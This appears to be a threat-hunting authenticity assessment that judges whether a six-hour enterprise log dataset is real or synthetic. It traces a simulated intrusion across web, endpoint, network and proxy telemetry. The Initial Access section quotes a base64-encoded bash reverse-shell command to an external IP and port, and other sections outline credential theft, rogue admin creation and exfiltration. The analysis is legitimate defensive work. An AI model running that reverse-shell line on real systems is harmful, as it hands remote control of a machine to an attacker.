# Threat Hunter — Authenticity Assessment

## Verdict

**Assessment:** Real  
**Verdict Confidence:** 76  
**Synthetic-Confidence Score:** 35

## Executive Summary

This six-hour, 18-host dataset is operationally coherent and mostly production-like: the principal intrusion path can be pivoted across web, endpoint, authentication, network, firewall, proxy, and file telemetry without impossible visible ordering or identity contradictions. Several low-to-moderate synthetic tells remain—especially deterministic scheduled-task texture, a 390-second unexplained delay before one SMB copy, a missing source-side PsExec process, and a tightly sequenced stale-account failure burst—but none outweigh the realistic source volumes, exposed-DMZ noise, lifecycle handling, and cross-source timing.

## Evidence For Synthetic

- `[distribution_texture]` The Ubuntu-family `debian-sa1 1 1` activity is highly deterministic across eight hosts. There are 88 child executions, with each host pinned to a fixed half-hour phase and roughly one-second timing texture: APP-INT-01 at `:00/:30`, MAIL-CLIN-01 at `:04/:34`, WEB-EXT-01 at `:01/:31`, WS-OHADDAD-01 at `:07/:37`, and so on. Cron is naturally periodic, but the estate-wide host-specific phasing plus near-identical event shape and occasional whole-slot omission looks generated.
- `[contract_gap]` On WS-AJOHNSON-01, the PowerShell `Copy-Item` process for `\\FILE-SRV-01\C$\ProgramData\Microsoft\cache_7f3a.zip` starts at `17:17:41.848Z`, loads its modules immediately, but produces no FILE-SRV-01 SMB connection until `17:24:06.181Z`; the local file appears at `17:24:12.115Z`. A 390-second idle period before the first visible file-server attempt is difficult to explain given otherwise rich process and network coverage.
- `[contract_gap]` The `16:00:13-16:00:19Z` PsExec operation is richly visible on DC-01—source `10.10.1.35`, NTLM Type 3 logon for `aisha.johnson`, `PSEXESVC` file/service creation, service process, and `cmd.exe /c whoami && hostname`—but WS-AJOHNSON-01 contains only PID 4 SMB flows and an unowned RPC flow. No source-side `PsExec.exe`/equivalent process or explicit-credential event is visible. This can be a collection gap, but it weakens an otherwise high-fidelity endpoint contract.
- `[distribution_texture]` Nine `svc_mgmt` failures occur from `15:23:33Z` through `15:23:55Z`, spaced two to four seconds apart across MAIL-FIN-01, DB-PROD-01, MAIL-CLIN-01, PROXY-01, MAIL-EDGE-01, APP-INT-01, DC-01, FILE-SRV-01, and WEB-EXT-01. The sources hop among unrelated systems (`10.10.3.20`, `10.10.3.10`, `10.10.2.26`, `10.10.4.10`, `10.10.2.20`, and local/unknown), giving the stale-account noise a scripted sweep shape.
- `[weak_signal]` Interactive Linux history frequently resembles a reusable diagnostic-command pool. For example, exact commands such as `/usr/sbin/iptables -L -n -v`, `systemctl list-units --state=failed --no-pager`, and `iostat -xz 1 3` recur on four distinct hosts each; `ss -s`, `ss -ltnp`, and `find /var/log -type f -mtime -1` recur on three. One DB-PROD-01 history entry also runs `yum check-update` despite surrounding Debian/Ubuntu evidence (`apt`, `dpkg`, `debian-sa1`), though this could simply be an unsuccessful operator habit.
- `[weak_signal]` Successful logons greatly outnumber failures: only 30 failed eCAR logins appear among 1,224 login records. For a small, curated six-hour slice this is plausible, but the low failure volume combined with the concentrated scripted-looking failure bursts is somewhat cleaner than many enterprise collections.

## Evidence For Real

- The dataset has a believable collection scope: 18 hosts, two Zeek sensors, perimeter ASA, two Snort views, proxy, web access, Windows Security/Sysmon, Linux syslog/history, and eCAR endpoint telemetry over approximately `2024-03-18 12:00:01Z` to `18:00:01Z`.
- The source-family mix is substantial rather than attack-dominated: 83,398 logical records, including 25,241 eCAR, 20,312 Zeek, 17,887 Windows XML events, 12,215 ASA messages, 4,254 syslog records, 1,848 proxy records, 899 web records, and 226 Snort alerts.
- The public DMZ has convincing background pressure. Zeek-DMZ records 5,447 connections, including 1,182 `S0` attempts and varied inbound probes for 22, 23, 25, 80, 135, 139, 443, 445, 2323, 3389, 5985, 8080, and 8443. Core traffic is correspondingly calmer: 5,885 of 6,111 connections are `SF`.
- The initial compromise pivots cleanly. `WEB-EXT-01/web_access.log` records `185.70.41.45` POSTing `/ehr/admin/upload.php` at `13:20:10Z`; Zeek-DMZ shows the same client’s TLS connection to `10.10.3.10:443` beginning `13:20:10.900Z`; eCAR creates the www-data base64 reverse-shell process at `13:20:12.629Z`; and its C2 flow to `45.33.32.30:8443` appears at `13:20:14.353Z`.
- The C2 tuple has credible multi-source variance without contradiction. Zeek-DMZ begins it at `13:20:13.051Z`, lasts `20.719s`, and counts `617/1826` payload bytes; ASA builds the NAT and connection at `13:20:13`, tears it down at `13:20:33`, and counts 3,148 bytes. These are compatible source-native views rather than copied values.
- Lateral movement from WEB-EXT-01 to APP-INT-01 is well ordered. Zeek-core opens `10.10.3.10:41712 -> 10.10.2.30:22` at `14:14:23.658Z`; the source eCAR flow appears at `14:14:24.415Z`; APP-INT-01 creates `sshd: root [priv]` at `14:14:24.331Z`, records its inbound flow at `14:14:25.230Z`, logs in root at `14:14:28.288Z`, and creates `-bash` at `14:14:30.635Z`.
- That SSH lifecycle remains coherent through close. Zeek gives the connection a `13,356.043s` duration, ASA tears it down at `17:56:59`, APP-INT-01 logs root out at `17:57:02.248Z`, and no termination-before-creation inversion was found.
- The Windows remote-administration chain is source-native and usable despite the missing client process: DC-01 records a Type 3 NTLM logon for `aisha.johnson` from `WS-AJOHNSON-01/10.10.1.35:63369`, Event 4697 for `PSEXESVC`, Sysmon file/process evidence, and the LocalSystem child command.
- Persistence and account manipulation are plausible. DC-01 shows creation of domain account `svc_mhsync`, addition to Domain Admins, `DeviceSyncSvc` creation, an hourly scheduled task, later service execution, and eventual account deletion. The Security log also records Event 1102 immediately after `wevtutil cl Security`, so the visible cleanup action has its expected companion.
- Data staging is operationally coherent. FILE-SRV-01 creates a roughly 313 MB archive under `svc_mhsync`; WS-AJOHNSON-01 retrieves it over SMB; Zeek files/conn agree on the path, UID, size, endpoints, and duration; Chrome then reads the local file and sends a `314,782,833`-byte POST through the proxy.
- Database collection and SCP are similarly consistent. DB-PROD-01 records `mysqldump`, the SQL file, gzip output, subsequent reads, and `scp`; Zeek-core records `10.10.4.10:57638 -> 10.10.2.30:22` for `4.654s`; APP-INT-01 records the inbound SSH transfer session and target file creation in `/tmp/.cache/`.
- Background evidence contains varied web browsing, SSH administration, LDAP/Kerberos/SMB traffic, DHCP renewals, package activity, sudo open/close pairs, Windows updater processes, service-account noise, RDP, DNS, TLS chains, mail, and Internet scanning. The attack is visible to a hunter but is not the dominant volume.

## Detailed Analysis

### Scope and Quantitative Orientation

The visible window is about six hours, from `12:00:01Z` to `18:00:01Z` on 18 March 2024. The host inventory includes Windows workstations and servers, Ubuntu/Linux workstations and servers, an external web host, internal application and database systems, mail systems, a proxy, file server, and domain controller.

Logical record counts were:

- eCAR: 25,241
- Zeek: 20,312
- Windows Security: 13,462
- Sysmon: 4,425
- ASA: 12,215
- Linux syslog: 4,254
- Proxy: 1,848
- Web access: 899
- Bash history: 516
- Snort: 226
- Total: 83,398

The eCAR distribution is dominated by 15,682 FLOW/CONNECT records, followed by 2,523 module loads, 1,762 process creates, 1,450 process terminations, 1,224 logins, 842 logouts, 772 registry modifications, and 530 process opens. No process object with both visible create and terminate events terminated before its creation.

Windows Security is plausibly dominated by 7,920 Event 5156 records, with 1,102 Event 4624 logons, 1,070 Kerberos service-ticket events, 914 process creates, 747 logoffs, 653 process terminations, and smaller counts of explicit credentials, failures, account/group changes, service installation, and log clearing.

### Initial Access and Command-and-Control

At `13:20:10Z`, the external web log shows a successful POST to `/ehr/admin/upload.php` from `185.70.41.45`. The matching Zeek-DMZ TLS flow starts at `13:20:10.900Z`, identifies SNI `ehr-portal.meridianhcs.com`, negotiates TLS 1.3, and lasts about 10.5 seconds.

At `13:20:12.629Z`, WEB-EXT-01 creates:

`bash -c 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC80NS4zMy4zMi4zMC84NDQzIDA+JjEi | base64 -d | bash'`

The decoded command is a reverse shell to `45.33.32.30:8443`. eCAR records that flow at `13:20:14.353Z`; Zeek and ASA see it at `13:20:13Z`, with mutually compatible durations and volume. The process terminates at `13:21:02.509Z`, so the short initial command process does not unrealistically remain alive indefinitely.

### Discovery and Lateral Movement

A long-lived root SSH session reaches WEB-EXT-01 from `10.10.1.36` at `13:39:49Z`. Within that shell, commands inspect network configuration, hosts, resolver settings, application credentials, and `/root/.ssh/id_rsa`. At `14:13-14:14Z`, WEB-EXT-01 probes APP-INT-01 ports 135, 445, 3389, 80, and finally SSH. Both Snort sensors flag the SSH step, while Zeek, ASA, source eCAR, and destination eCAR agree on the tuple.

The successful root session on APP-INT-01 remains open while the actor reads `/etc/passwd` and `/etc/shadow`, later uses the stolen key to reach DB-PROD-01, and receives the SCP-staged database archive. Timing and process/session ownership are consistent.

### Windows Domain Activity

WS-AJOHNSON-01 performs domain enumeration at `15:20:22Z` using `net user /domain` and `net group "Domain Admins" /domain`. At `16:00Z`, its IP initiates SMB/RPC activity to DC-01, followed by target-side PsExec artifacts and a SYSTEM shell.

DC-01 then creates `svc_mhsync`, adds it to Domain Admins, creates `DeviceSyncSvc`, creates an hourly scheduled task, and executes the service. The service account later runs archive creation on FILE-SRV-01. These steps are technically feasible and use plausible Windows-native artifacts.

The main weakness is the absence of a source-side PsExec client process on WS-AJOHNSON-01 despite good endpoint coverage. That gap affects pivot completeness but does not create an impossible target-side sequence.

### Collection, Staging, and Exfiltration

FILE-SRV-01 starts PowerShell archive creation at `17:01:18.893Z` and terminates it at `17:01:47.246Z`. At `17:24:06.181Z`, WS-AJOHNSON-01 retrieves the 313 MB archive over SMB in about 5.75 seconds; Zeek files reports 313,665,595 bytes and the destination file appears at `17:24:12.115Z`.

Chrome reads the file less than one second later and opens a proxied connection at `17:24:53.483Z`. The proxy records a POST to `/upload/telemetry/7f3a2b19` with `cs_bytes=314782833`, and Zeek-core independently shows 314,783,099 origin bytes over the client-to-proxy connection. That small protocol-overhead difference is realistic.

The suspicious timing artifact is earlier: the `Copy-Item` PowerShell process starts at `17:17:41.848Z`, more than six minutes before the SMB connection. No prior attempt to FILE-SRV-01 is visible during that wait.

Separately, APP-INT-01 reaches DB-PROD-01 via SSH at `17:14:38Z`; DB-PROD-01 performs database discovery, dump, gzip, and SCP; APP-INT-01 receives the resulting archive at `17:25:12Z`. This second staging path is internally consistent.

### Baseline and Signal-to-Noise

The public-facing host is surrounded by convincing scan and web noise. The core network contains diverse DNS, Kerberos, LDAP, SMB, HTTP, SSH, DHCP, SMTP, TLS, RDP, and DCE/RPC. Proxy traffic includes browsers, system agents, package managers, service health checks, success, denial, authentication-required, and gateway-error outcomes.

The strongest baseline fingerprint is scheduled Linux activity. Eight hosts use the identical Debian sysstat command at half-hour intervals with a fixed phase per host and only millisecond-scale jitter. That is plausible as centrally managed cron but unusually pristine across the whole visible estate.

Interactive command histories are varied, yet many read as permutations of the same diagnostic pool. This is a moderate authenticity concern rather than a contradiction because the apparent users include active engineering and operations staff.

## Synthetic Indicator Summary

| Category | Affected source family | Scope | Impact |
|---|---|---:|---|
| `distribution_texture` | Linux eCAR/syslog | Dataset-wide across 8 hosts; 88 child executions | Fixed half-hour `debian-sa1` phases and near-identical shape create the clearest generator-like baseline texture. |
| `contract_gap` | Windows eCAR + Zeek SMB | One attack staging operation | `Copy-Item` is alive for about 390 seconds before its first visible SMB attempt, with no supporting wait/retry evidence. |
| `contract_gap` | Windows eCAR/Security/Sysmon | One PsExec operation | Target evidence is complete, but the source-side client process/command is absent despite source network telemetry. |
| `distribution_texture` | Cross-host authentication | One nine-host burst | `svc_mgmt` failures sweep unrelated hosts and sources at two-to-four-second intervals. |
| `weak_signal` | Bash history/syslog | Repeated across Linux hosts | Generic diagnostic commands recur across unrelated users and roles; one Ubuntu-like host records an attempted `yum` command. |
| `weak_signal` | Authentication | Dataset-wide | Only 30 failed eCAR logins versus 1,224 login records, with failures clustered into a few stylized bursts. |

## Realism Score by Category

- **Field format accuracy:** 9 — The reviewed fields, paths, tuples, IDs, byte counts, and source-native event shapes were credible; no impossible field value was found.
- **Temporal patterns:** 7 — Attack lifecycles are ordered correctly, but the delayed SMB copy and highly phased cron texture reduce confidence.
- **Cross-source correlation:** 9 — Web, endpoint, Zeek, ASA, proxy, Windows, and file pivots align with realistic sensor-specific offsets and accounting differences.
- **Behavioral realism:** 8 — The intrusion techniques and host actions work operationally, while some baseline command and stale-account patterns feel templated.
- **Environmental consistency:** 8 — Host roles, exposed-DMZ noise, core services, and source volumes are generally plausible; a few management and command-placement details are odd but possible.

## Recommendations

- If this were synthetic, vary scheduled Linux task policy by host role and installation history. Preserve cron periodicity, but use more than one cadence, realistic package defaults, occasional execution delay, disabled jobs, and host-specific long-tail tasks.
- Tie file-copy process timing to the actual SMB attempt. If a command must wait six minutes, emit a visible reason such as retries, name-resolution/authentication delays, or a prior failed connection; otherwise start the process near the successful transfer.
- Preserve the source-side caller for Windows remote-administration bundles when source endpoint telemetry is present. For this PsExec case, add the client process, user/session ownership, and any applicable explicit-credential evidence before the SMB/RPC flows.
- Make stale-account failure campaigns arise from a stable source or identifiable scheduled task and use service-appropriate protocols. Avoid hopping among unrelated source hosts at uniform two-to-four-second intervals unless the logs also show a real orchestration mechanism.
- Broaden Linux interactive histories with role-specific work, command errors, return-code consequences, paths and arguments that carry forward between commands, and host-appropriate package tooling. Reduce reuse of the same generic diagnostic command pool across unrelated accounts.
